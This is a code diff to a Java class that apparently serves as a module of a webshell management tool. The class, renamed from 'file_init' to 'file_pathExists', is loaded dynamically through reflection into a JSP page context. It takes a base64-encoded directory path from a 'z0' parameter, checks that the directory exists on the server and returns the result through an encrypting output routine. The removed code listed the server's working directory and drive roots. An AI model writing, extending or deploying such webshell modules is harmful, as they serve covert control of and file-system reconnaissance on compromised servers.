@@ -1,14 +1,17 @@
-import java.io.*;
+import java.io.File;
+import java.io.OutputStream;
+import java.io.PrintWriter;
+import java.io.StringWriter;
 import java.lang.reflect.Method;
-import java.util.ArrayList;
+import java.nio.charset.StandardCharsets;
+import java.util.Base64;
 import java.util.HashMap;
-import java.util.List;
 import java.util.Map;
 
-public class file_init extends ClassLoader
+public class file_pathExists extends ClassLoader
 {
-    public file_init(ClassLoader objParent) { super(objParent); }
-    public file_init() { super(file_init.class.getClassLoader()); }
+    public file_pathExists(ClassLoader objParent) { super(objParent); }
+    public file_pathExists() { super(file_pathExists.class.getClassLoader()); }
 
     private Map<String, String> fnParseParams(String szParamStr)
     {
@@ -56,10 +59,7 @@ public class file_init extends ClassLoader
             Method fnFlushBuffer = objResponse.getClass().getMethod("flushBuffer", new Class[0]);
             fnFlushBuffer.invoke(objResponse, new Object[0]);
         }
-        catch (Exception exIgnored)
-        {
-
-        }
+        catch (Exception exIgnored) {}
     }
 
     private byte[] Encrypt(Object objPageContext, byte[] abRawResponse)
@@ -96,7 +96,7 @@ public class file_init extends ClassLoader
         Object objRequest = null;
         Object objResponse = null;
         OutputStream osClient = null;
-        
+
         try
         {
             Method fnGetRequest = objPageContext.getClass().getMethod("getRequest", new Class[0]);
@@ -123,95 +123,24 @@ public class file_init extends ClassLoader
             int nParamOffset = nClassLength + 4;
             int nParamLength = abPayload.length - nParamOffset;
             String szParam = new String(abPayload, nParamOffset, nParamLength, "UTF-8").trim();
-
             Map<String, String> mapParams = fnParseParams(szParam);
-            String szSplitter = mapParams.get("splitter");
-            
-            String szCurrentDir = "";
-            try
-            {
-                Method fnGetServletContext = objRequest.getClass().getMethod("getServletContext", new Class[0]);
-                Object objServletContext = fnGetServletContext.invoke(objRequest, new Object[0]);
-
-                Method fnGetRealPath = objServletContext.getClass().getMethod("getRealPath", new Class[]{String.class});
-                String szRootPath = (String) fnGetRealPath.invoke(objServletContext, new Object[]{"/"});
-
-                Method fnGetServletPath = objRequest.getClass().getMethod("getServletPath", new Class[0]);
-                String szServletPath = (String) fnGetServletPath.invoke(objRequest, new Object[0]);
-
-                szRootPath = szRootPath.replace("\\", "/");
-                szServletPath = szServletPath.replace("\\", "/");
-                
-                if (!szRootPath.endsWith("/"))
-                    szRootPath += "/";
-                if (szServletPath.startsWith("/"))
-                    szServletPath = szServletPath.substring(1);
-                
-                String szFullPath = szRootPath + szServletPath;
-
-                szCurrentDir = szFullPath.substring(0, szFullPath.lastIndexOf("/") + 1);
-                szCurrentDir = szCurrentDir.replace("/", java.io.File.separator);
-
-            }
-            catch (Exception e)
-            {
-                try
-                {
-                    Method fnGetServletContext = objRequest.getClass().getMethod("getServletContext", new Class[0]);
-                    Object objServletContext = fnGetServletContext.invoke(objRequest, new Object[0]);
-                    Method fnGetRealPath = objServletContext.getClass().getMethod("getRealPath", new Class[]{String.class});
-                    String szRootPath = (String) fnGetRealPath.invoke(objServletContext, new Object[]{"/"});
-
-                    Method fnGetRequestURI = objRequest.getClass().getMethod("getRequestURI", new Class[0]);
-                    String szURI = (String) fnGetRequestURI.invoke(objRequest, new Object[0]);
-
-                    String szFullPath = szRootPath.replace("\\", "/") + szURI.replace("\\", "/");
-                    szCurrentDir = szFullPath.substring(0, szFullPath.lastIndexOf("/") + 1);
-                    szCurrentDir = szCurrentDir.replace("/", java.io.File.separator);
-                }
-                catch (Exception ex)
-                {
-                    szCurrentDir = System.getProperty("user.dir");
-                }
-            }
-
-            if (szCurrentDir.length() > 1 && szCurrentDir.endsWith(java.io.File.separator)) {
-                szCurrentDir = szCurrentDir.substring(0, szCurrentDir.length() - 1);
-            }
-
-            boolean bIsWindows = System.getProperty("os.name").toLowerCase().contains("win");
-
             StringBuilder sb = new StringBuilder();
-            
-            sb.append(szCurrentDir);
-            sb.append("|");
-            if (!bIsWindows)
+
+            String z0 = mapParams.get("z0");
+            String szDir = new String(Base64.getDecoder().decode(z0), StandardCharsets.UTF_8);
+
+            File dir = new File(szDir);
+            if (dir.exists() && dir.isDirectory())
             {
-                // Unix-like
-                sb.append("/");
+                String szPath = dir.getCanonicalPath();
+                sb.append("1|" + szPath);
             }
             else
             {
-                File[] roots = File.listRoots();
-                if (roots != null)
-                {
-                    List<String> lsDrive = new ArrayList<>();
-                    for (File root : roots)
-                    {
-                        String szPath = root.getAbsolutePath();
-                        if (szPath.endsWith(("\\")))
-                            szPath = szPath.substring(0, szPath.length() - 1);
-
-                        lsDrive.add(szPath);
-                    }
-
-                    sb.append(String.join(",", lsDrive));
-                }
+                sb.append("ERROR://Cannot open directory.");
             }
 
-            String szOutput = sb.toString();
-
-            fnWriteOutput(objParam, objResponse, osClient, szOutput.getBytes());
+            fnWriteOutput(objParam, objResponse, osClient, sb.toString().getBytes());
         }
         catch (Exception ex)
         {
